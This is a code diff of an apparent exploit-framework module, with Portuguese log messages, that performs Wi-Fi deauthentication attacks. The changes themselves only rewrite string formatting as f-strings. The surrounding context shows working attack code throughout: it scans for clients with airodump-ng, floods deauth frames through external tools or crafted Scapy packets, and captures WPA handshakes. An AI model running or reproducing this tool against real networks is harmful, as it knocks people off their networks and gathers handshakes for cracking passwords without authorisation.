@@ -74,7 +74,7 @@ class Exploit(Exploit):
 
     def _check_pmf(self) -> bool:
         """Check if target AP advertises PMF (802.11w) via beacon analysis."""
-        print_status("Checking PMF/802.11w status for {}...".format(self.target_bssid))
+        print_status(f"Checking PMF/802.11w status for {self.target_bssid}...")
         try:
             result = subprocess.run(
                 ["airodump-ng", "--bssid", self.target_bssid, "--write-interval", "1",
@@ -111,7 +111,7 @@ class Exploit(Exploit):
         if not shutil.which("airodump-ng"):
             return []
 
-        scan_tmp = Path(".tmp") / "wxf_scan_{:x}".format(int(time.time() * 1000))
+        scan_tmp = Path(".tmp") / f"wxf_scan_{int(time.time() * 1000):x}"
         scan_tmp.mkdir(parents=True, exist_ok=True)
         try:
             out_prefix = str(scan_tmp / "scan")
@@ -178,7 +178,7 @@ class Exploit(Exploit):
 
         _tmp_base = Path(".tmp")
         _tmp_base.mkdir(parents=True, exist_ok=True)
-        out_dir_path = _tmp_base / "wxf_deauth_{:x}".format(int(time.time() * 1000))
+        out_dir_path = _tmp_base / f"wxf_deauth_{int(time.time() * 1000):x}"
         out_dir_path.mkdir(parents=True, exist_ok=True)
         out_dir = str(out_dir_path)
         clients = self._scan_clients()
@@ -186,9 +186,9 @@ class Exploit(Exploit):
         if not clients:
             print_info("Nenhum cliente detectado via scan. Usando broadcast.")
         else:
-            print_info("Clientes detectados: {}".format(clients))
+            print_info(f"Clientes detectados: {clients}")
 
-        cap_prefix = "{}/hs".format(out_dir)
+        cap_prefix = f"{out_dir}/hs"
         cap_cmd = ["sudo", "airodump-ng",
                    "--bssid", self.target_bssid,
                    "-w", cap_prefix,
@@ -234,8 +234,7 @@ class Exploit(Exploit):
 
                 try:
                     subprocess.run(cmd, timeout=8, capture_output=True, check=False)
-                    print_info("  Deauth -> {} (client: {})".format(
-                        self.target_bssid[:11], client[:11]))
+                    print_info(f"  Deauth -> {self.target_bssid[:11]} (client: {client[:11]})")
                 except subprocess.TimeoutExpired:
                     pass
 
@@ -249,12 +248,12 @@ class Exploit(Exploit):
                     capture_output=True, text=True, timeout=5,
                 )
                 if "1 handshake" in result.stdout.lower():
-                    print_success("HANDSHAKE CAPTURADO em: {}".format(cap_file))
+                    print_success(f"HANDSHAKE CAPTURADO em: {cap_file}")
                     break
 
         if cap_proc:
             cap_proc.terminate()
-            print_info("Captura encerrada. Arquivo: {}-01.cap".format(cap_prefix))
+            print_info(f"Captura encerrada. Arquivo: {cap_prefix}-01.cap")
 
     def _run_scapy_deauth(self) -> None:
         """Run deauth using Scapy directly (no external tools needed)."""
@@ -264,8 +263,7 @@ class Exploit(Exploit):
             print_error("Scapy not available for direct deauth.")
             return
 
-        print_status("Scapy deauth: {} -> {} on {}".format(
-            self.target_bssid, self.client_mac, self.interface))
+        print_status(f"Scapy deauth: {self.target_bssid} -> {self.client_mac} on {self.interface}")
 
         pkt_ap_to_client = (
             RadioTap() /
@@ -301,7 +299,7 @@ class Exploit(Exploit):
         except KeyboardInterrupt:
             pass
 
-        print_success("Sent {} deauth frames.".format(sent))
+        print_success(f"Sent {sent} deauth frames.")
 
     def check(self) -> str:
         """Verify wireless interface is in monitor mode and ready."""
@@ -312,11 +310,11 @@ class Exploit(Exploit):
                     ["iwconfig", str(iface)], stderr=subprocess.STDOUT, timeout=5
                 ).decode("utf-8", "replace")
                 if "Monitor" in out:
-                    return "Interface {} is in Monitor mode - prerequisites OK".format(iface)
+                    return f"Interface {iface} is in Monitor mode - prerequisites OK"
                 if "no wireless extensions" not in out.lower():
                     return (
-                        "Interface {} found but NOT in Monitor mode"
-                        " - run airmon-ng start {}".format(iface, iface)
+                        f"Interface {iface} found but NOT in Monitor mode"
+                        f" - run airmon-ng start {iface}"
                     )
             except (subprocess.CalledProcessError, FileNotFoundError, subprocess.TimeoutExpired):
                 pass
@@ -326,12 +324,12 @@ class Exploit(Exploit):
                     ["iw", "dev"], stderr=subprocess.STDOUT, timeout=5
                 ).decode("utf-8", "replace")
                 if str(iface) in out:
-                    return "Interface {} detected via iw - verify monitor mode".format(iface)
+                    return f"Interface {iface} detected via iw - verify monitor mode"
             except Exception:
                 pass
         return (
-            "Interface {} not found"
-            " - connect wireless adapter and enable monitor mode".format(iface)
+            f"Interface {iface} not found"
+            " - connect wireless adapter and enable monitor mode"
         )
 
     def run(self) -> None:
@@ -388,22 +386,21 @@ class Exploit(Exploit):
         elif backend == "mdk4":
             cmd = self._build_mdk4_cmd()
         else:
-            print_error("Backend desconhecido '{}'.".format(backend))
+            print_error(f"Backend desconhecido '{backend}'.")
             return
 
         cmd_str = " ".join(cmd)
-        print_status("Deauth {} (modo: {}, backend: {})...".format(
-            self.target_bssid, self.mode, backend))
-        print_info("Command: {}".format(cmd_str))
+        print_status(f"Deauth {self.target_bssid} (modo: {self.mode}, backend: {backend})...")
+        print_info(f"Command: {cmd_str}")
 
         timeout = int(self.duration) if int(self.duration) > 0 else None
         try:
             subprocess.run(cmd, timeout=timeout, check=False)
             print_success("Deauth concluido.")
         except subprocess.TimeoutExpired:
-            print_info("Deauth: duracao atingida ({:.0f}s).".format(self.duration))
+            print_info(f"Deauth: duracao atingida ({self.duration:.0f}s).")
         except KeyboardInterrupt:
             print_info("\nDeauth interrompido.")
         except Exception as err:
-            print_error("Deauth falhou: {}. Tentando Scapy...".format(err))
+            print_error(f"Deauth falhou: {err}. Tentando Scapy...")
             self._run_scapy_deauth()
